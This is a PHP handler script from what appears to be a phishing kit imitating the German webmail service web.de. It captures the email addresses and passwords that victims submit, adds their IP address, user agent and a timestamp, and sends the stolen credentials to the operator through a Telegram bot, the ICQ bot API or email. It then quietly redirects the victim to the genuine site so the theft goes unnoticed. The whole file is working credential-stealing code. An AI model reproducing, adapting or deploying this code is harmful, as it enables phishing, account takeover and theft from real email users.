<?php 
session_start();
ob_start();
require_once '../func.php';
require_once '../Results/ResultsConfig.php';

$_SESSION['randString'] = genRandString();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
if (!empty( $_POST['username'] ) ) {
		$Date = date("Y/m/d h:i:sa");
		$_SESSION['username'] = $_POST['username'];
		$_SESSION['password'] = $_POST['password'];

		$nl = "\r\n";
		$code = "============== 🎯[ WEB Email Two By YBA | ]🎯 ==============".$nl;
		$code .= "[EMAIL ADDRESS] 	: ".$_SESSION['username'].$nl;
		$code .= "[PASSWORD] 		: ".$_SESSION['password'].$nl;
		$code .= "	--------🔑 I N F O | I P 🔑 --------	".$nl;
		$code .= "IP		: ".$ip.$nl;
		$code .= "IP lookup		: https://ip-api.com/".$ip.$nl;
		$code .= "OS		: ".$useragent.$nl;
		$code .= "DATE		: ".$Date.$nl;
		$code .= "============= [ ./😈😈 WEB Email Two By YBA 😈😈 ] =============".$nl;

		if (strpos(strtolower($Telegram),'yes') !== false)
		{
		    require_once '../Results/Telegram.php';
			$params=[
				'chat_id'=>$ChatID,
				'text'=>$code,
			];
		    SendHits('https://api.telegram.org/bot'.$Token.'/sendMessage',$params);
		}
		if (strpos(strtolower($ICQ),'yes') !== false)
		{
		    require_once '../Results/ICQ.php';
			$params=[
				'token'=>$Token,
				'chatId'=>$ChatID,
				'text'=>$code,
			];
		    SendHits('https://api.icq.net/bot/v1/messages/sendText',$params);
		}
		if (strpos(strtolower($Email),'yes') !== false)
		{
		$code = <<<EOT
============== 🎯[ WEB Email Two By YBA | ]🎯 ==============
[EMAIL ADDRESS] : {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['password']}
	--------🔑 I N F O | I P 🔑 --------
IP		: {$ip}
IP lookup		: https://ip-api.com/{$ip}
OS		: {$useragent}
DATE		: {$Date}
============= [ ./😈😈 WEB Email Two By YBA😈😈 ] =============
\r\n\r\n
EOT;
			$subject = "😈😈 WEB Email Two By YBA 😈😈  From $ip";
	        $headers = "From: 💰YBA💰 <webby@yba.com>\r\n";
	        $headers .= "MIME-Version: 1.0\r\n";
	        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

		    require_once '../Results/Email.php';
		    @mail($Email,$subject,$code,$headers);
		}

        $sessionId = $_SESSION['randString'];
        header("Location: https://web.de/");
        exit();
	} else {
		header("Location: https://web.de/");
		exit();
	}
?>
